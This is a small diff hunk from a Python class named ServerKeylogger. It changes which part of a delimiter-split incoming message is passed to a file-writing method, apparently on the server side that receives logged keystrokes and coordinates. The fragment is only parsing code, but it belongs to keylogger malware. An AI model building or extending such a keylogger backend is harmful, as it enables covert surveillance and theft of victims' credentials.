@@ -93,7 +93,7 @@ class ServerKeylogger:
                     self.new_cor = "[(" + self.full_msg.split("[(")[1]
                     spalten = self.full_msg.split("[(")[0].split("***%§§)§§%")
                     # This splits the data with the special code
-                    self.do_file(spalten[0])
+                    self.do_file(spalten[1])
 
                 else:
                     # Checks if the coordinates are there
